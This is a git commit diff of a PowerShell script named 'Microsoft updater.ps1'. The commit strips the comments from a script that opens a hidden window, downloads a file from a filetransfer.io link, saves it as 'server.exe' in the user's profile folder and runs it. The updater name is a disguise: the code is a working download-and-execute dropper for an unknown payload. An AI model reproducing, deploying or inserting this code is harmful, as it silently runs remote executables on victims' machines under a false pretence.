a6764836dac2dfd658bd419f82ea12b9419f3b23
Ahmed Moustafa <30881400+AhmedK97@users.noreply.github.com>
2023-08-17 21:01:57 +0300

    Update Microsoft updater.ps1

--- Microsoft updater.ps1
+++ Microsoft updater.ps1
@@ -1,21 +1,10 @@
 ﻿PowerShell.exe -WindowStyle hidden {
-# URL of the file to download
 $url = "https://filetransfer.io/data-package/A4QWrqps/download"
-
-# Get the user's "Downloads" folder
 $downloadsFolder = [Environment]::GetFolderPath("User")
-
-# Local path to save the downloaded file
 $outputPath = Join-Path -Path $downloadsFolder -ChildPath "server.exe"
-
-# Download the file
 Invoke-WebRequest -Uri $url -OutFile $outputPath
-
-# Wait for the download to complete
 while ((Test-Path -Path $outputPath) -eq $false) {
     Start-Sleep -Seconds 1
 }
-
-# Run the downloaded file
 Start-Process -FilePath $outputPath
 }
